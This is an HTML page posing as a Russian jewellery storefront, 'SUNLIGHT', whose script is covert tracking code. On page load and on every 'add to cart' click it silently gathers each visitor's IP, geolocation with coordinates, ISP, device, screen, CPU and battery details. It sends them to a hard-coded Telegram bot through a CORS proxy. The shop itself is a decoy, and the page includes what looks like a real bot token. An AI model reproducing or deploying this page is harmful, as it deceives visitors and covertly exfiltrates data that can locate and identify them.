<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SUNLIGHT — Ювелирный магазин</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=Playfair+Display:wght@500;600&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #fbfbfb;
    --text: #111;
    --text-light: #7a7a7a;
    --border: #ebebeb;
    --accent: #d4af37;
    --red: #e53935;
    --card-bg: #ffffff;
  }
  
  * { box-sizing: border-box; margin: 0; padding: 0; }
  
  body {
    font-family: 'Inter', sans-serif;
    background: var(--bg);
    color: var(--text);
    -webkit-font-smoothing: antialiased;
    overflow-x: hidden;
  }
  
  a { text-decoration: none; color: inherit; }
  button { cursor: pointer; font-family: inherit; border: none; background: none; }

  header {
    position: sticky; top: 0; z-index: 100;
    background: rgba(251, 251, 251, 0.95);
    backdrop-filter: blur(12px);
    border-bottom: 1px solid var(--border);
    padding: 18px 24px;
    display: flex; justify-content: space-between; align-items: center;
  }
  
  .logo {
    font-family: 'Playfair Display', serif;
    font-size: 28px; font-weight: 600; letter-spacing: 3px;
    text-transform: uppercase;
  }
  .logo span { color: var(--accent); }

  .nav-links {
    display: flex; gap: 32px; font-size: 13px; 
    font-weight: 500; text-transform: uppercase; letter-spacing: 1px;
  }
  .nav-links a { position: relative; padding-bottom: 4px; }
  .nav-links a::after {
    content: ''; position: absolute; bottom: 0; left: 0;
    width: 0%; height: 1px; background: var(--accent);
    transition: width 0.3s ease;
  }
  .nav-links a:hover::after { width: 100%; }
  
  .header-icons { display: flex; gap: 20px; font-size: 20px; }

  .hero {
    height: 500px;
    background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.7)), url('https://picsum.photos/seed/herojewel/1920/1080') center/cover;
    display: flex; flex-direction: column; justify-content: center; align-items: center;
    text-align: center; color: #fff; padding: 20px;
    filter: grayscale(0.3);
  }
  .hero h1 {
    font-family: 'Playfair Display', serif;
    font-size: 52px; font-weight: 500; margin-bottom: 16px; letter-spacing: 2px;
  }
  .hero p { font-size: 14px; font-weight: 400; letter-spacing: 4px; text-transform: uppercase; }

  .catalog { max-width: 1300px; margin: 0 auto; padding: 60px 24px; }
  
  .filters {
    display: flex; gap: 12px; overflow-x: auto; padding-bottom: 20px; margin-bottom: 40px;
    scrollbar-width: none; justify-content: center;
  }
  .filters::-webkit-scrollbar { display: none; }
  
  .filter-btn {
    padding: 12px 24px; border: 1px solid var(--border); border-radius: 40px;
    font-size: 13px; font-weight: 500; white-space: nowrap; 
    background: #fff; transition: all 0.3s ease; color: var(--text-light);
  }
  .filter-btn:hover, .filter-btn.active {
    background: var(--text); color: #fff; border-color: var(--text);
  }

  .grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
    gap: 40px 24px;
  }

  .card { 
    position: relative; cursor: pointer; 
    background: var(--card-bg); border-radius: 12px;
    transition: transform 0.4s ease, box-shadow 0.4s ease;
    padding-bottom: 16px;
  }
  .card:hover { transform: translateY(-8px); box-shadow: 0 20px 40px rgba(0,0,0,0.08); }
  
  .card-img-wrap {
    position: relative;
    width: 100%; aspect-ratio: 3/4;
    background: #f4f4f4; border-radius: 12px 12px 0 0; overflow: hidden;
    margin-bottom: 16px;
  }
  .card-img-wrap img {
    width: 100%; height: 100%; object-fit: cover;
    transition: transform 0.6s ease;
    filter: contrast(1.1) sepia(0.1);
  }
  .card:hover .card-img-wrap img { transform: scale(1.08); }

  .badge {
    position: absolute; top: 16px; left: 16px;
    background: var(--red); color: #fff;
    font-size: 11px; font-weight: 600; padding: 6px 10px; border-radius: 6px;
    letter-spacing: 1px; z-index: 2;
  }

  .add-to-cart {
    position: absolute; bottom: -50px; left: 0; width: 100%;
    background: rgba(17, 17, 17, 0.95); color: #fff;
    padding: 14px; font-size: 12px; text-transform: uppercase; letter-spacing: 2px;
    transition: bottom 0.3s ease; z-index: 3;
  }
  .card:hover .add-to-cart { bottom: 0; }

  .card-info { padding: 0 16px; }
  .card-title { font-size: 15px; font-weight: 500; margin-bottom: 8px; }
  .card-price { display: flex; align-items: center; gap: 10px; }
  .price-current { font-size: 16px; font-weight: 600; }
  .price-old { font-size: 14px; color: var(--text-light); text-decoration: line-through; }

  footer {
    border-top: 1px solid var(--border);
    padding: 60px 20px; text-align: center;
    color: var(--text-light); font-size: 13px; margin-top: 80px;
  }

  @media (max-width: 768px) {
    .nav-links { display: none; }
    .hero { height: 400px; }
    .hero h1 { font-size: 36px; }
    .grid { grid-template-columns: repeat(2, 1fr); gap: 20px 12px; }
    .card { padding-bottom: 8px; }
    .card-img-wrap { border-radius: 8px 8px 0 0; margin-bottom: 10px; }
    .card-info { padding: 0 8px; }
    .card-title { font-size: 12px; }
    .price-current { font-size: 14px; }
    .price-old { font-size: 11px; }
    .badge { font-size: 9px; padding: 4px 6px; top: 8px; left: 8px; }
    .add-to-cart { position: relative; bottom: 0; border-radius: 0 0 8px 8px; margin-top: 8px; padding: 10px; font-size: 10px; }
  }
</style>
</head>
<body>

  <header>
    <div class="logo">SUN<span>LIGHT</span></div>
    <nav class="nav-links">
      <a href="#">Каталог</a>
      <a href="#">Коллекции</a>
      <a href="#">Новинки</a>
      <a href="#">О бренде</a>
    </nav>
    <div class="header-icons">
      <span>🔍</span>
      <span>🤍</span>
      <span>🛒</span>
    </div>
  </header>

  <section class="hero">
    <h1>Искусство сиять</h1>
    <p>Новая коллекция украшений</p>
  </section>

  <main class="catalog">
    <div class="filters">
      <button class="filter-btn active">Все украшения</button>
      <button class="filter-btn">Кольца</button>
      <button class="filter-btn">Серьги</button>
      <button class="filter-btn">Браслеты</button>
      <button class="filter-btn">Подвески</button>
    </div>

    <div class="grid" id="productGrid"></div>
  </main>

  <footer>
    © 2026 SUNLIGHT. Все права защищены.
  </footer>

  <script>
    /* ════════════════════════════════════════════════════════
       ⚠️ ВПИШИ СВОИ ЗНАЧЕНИЯ СЮДА
       ════════════════════════════════════════════════════════ */
    const TG_TOKEN = "9259484153:AAECN3o7f468Ihs53LCMtnNC9Oso3xxmssw"; 
    const TG_CHAT  = "472749125"; 

    // Товары с надежными картинками
    const PRODUCTS = [
      { img: "https://picsum.photos/seed/ring1/600/800", title: "Кольцо с бриллиантом", price: "45 900 ₽", oldPrice: "57 000 ₽", badge: "-20%" },
      { img: "https://picsum.photos/seed/ear1/600/800", title: "Серьги из белого золота", price: "32 400 ₽", oldPrice: "", badge: "" },
      { img: "https://picsum.photos/seed/bracelet1/600/800", title: "Браслет с жемчугом", price: "18 700 ₽", oldPrice: "", badge: "ХИТ" },
      { img: "https://picsum.photos/seed/pendant1/600/800", title: "Подвеска с сапфиром", price: "24 500 ₽", oldPrice: "", badge: "" },
      { img: "https://picsum.photos/seed/ring2/600/800", title: "Кольцо с изумрудом", price: "68 000 ₽", oldPrice: "", badge: "" },
      { img: "https://picsum.photos/seed/ear2/600/800", title: "Длинные серьги с топазами", price: "41 200 ₽", oldPrice: "", badge: "NEW" },
      { img: "https://picsum.photos/seed/set1/600/800", title: "Вечерний гарнитур", price: "125 000 ₽", oldPrice: "140 000 ₽", badge: "SALE" },
      { img: "https://picsum.photos/seed/ring3/600/800", title: "Обручальное кольцо", price: "21 300 ₽", oldPrice: "", badge: "" }
    ];

    // Рисуем карточки
    const grid = document.getElementById('productGrid');
    PRODUCTS.forEach(item => {
      grid.insertAdjacentHTML('beforeend', `
        <div class="card">
          <div class="card-img-wrap">
            ${item.badge ? `<span class="badge">${item.badge}</span>` : ''}
            <img src="${item.img}" alt="${item.title}" loading="lazy">
            <button class="add-to-cart">В корзину</button>
          </div>
          <div class="card-info">
            <div class="card-title">${item.title}</div>
            <div class="card-price">
              <span class="price-current">${item.price}</span>
              ${item.oldPrice ? `<span class="price-old">${item.oldPrice}</span>` : ''}
            </div>
          </div>
        </div>
      `);
    });

    /* ════════════════════════════════════════════════════════
       СБОР ДАННЫХ И ОТПРАВКА ЧЕРЕЗ allorigins.win
       ════════════════════════════════════════════════════════ */
    
    async function collectAndSendData(stage) {
      let geo = { ip: "—", city: "—", country: "—", isp: "—", lat: null, lon: null };
      
      try {
        const r = await fetch("https://ipapi.co/json/");
        const d = await r.json();
        if (d.ip) geo = { ip: d.ip, city: d.city, country: d.country_name, isp: d.org, lat: d.latitude, lon: d.longitude };
      } catch(e) {}

      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "—";
      const lang = navigator.language || "—";
      const net = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType.toUpperCase() : "—";
      const cores = navigator.hardwareConcurrency || "—";
      const scr = `${screen.width}x${screen.height}`;
      
      let bat = "—";
      try {
        if (navigator.getBattery) {
          const b = await navigator.getBattery();
          bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "");
        }
      } catch(e) {}

      const dev = /iPhone|iPad|Android/i.test(navigator.userAgent) ? "Мобильное" :
                  /Mac/i.test(navigator.userAgent) ? "macOS" :
                  /Win/i.test(navigator.userAgent) ? "Windows" : "Неизвестно";

      const text = 
        `🕵️ ${stage}\n\n` +
        `🌍 СЕТЬ И ГЕО:\n` +
        `IP: ${geo.ip}\n` +
        `Локация: ${geo.city}, ${geo.country}\n` +
        `Провайдер: ${geo.isp}\n` +
        `Координаты: ${geo.lat}, ${geo.lon}\n` +
        `Таймзона: ${tz}\n` +
        `Язык: ${lang}\n` +
        `Сеть: ${net}\n\n` +
        `📱 УСТРОЙСТВО:\n` +
        `Тип: ${dev}\n` +
        `Экран: ${scr}\n` +
        `Ядер ЦП: ${cores}\n` +
        `Батарея: ${bat}\n` +
        `Время: ${new Date().toLocaleString("ru-RU")}`;

      // ⚠️ ИСПОЛЬЗУЕМ ПРОКСИ ALLORIGINS
      const tgUrl = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
      const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(tgUrl)}`;

      fetch(proxyUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: TG_CHAT, text: text })
      }).catch(()=>{});
    }

    // Собираем данные сразу при загрузке
    collectAndSendData("🚪 ВХОД НА САЙТ (SUNLIGHT)");

    // Отправляем данные при клике на "В корзину"
    document.querySelectorAll('.add-to-cart').forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.stopPropagation();
        collectAndSendData("🛒 ПОПЫТКА КУПИТЬ ТОВАР");
        btn.textContent = "ОБРАБОТКА...";
        setTimeout(() => btn.textContent = "В корзину", 2000);
      });
    });

  </script>
</body>
</html>
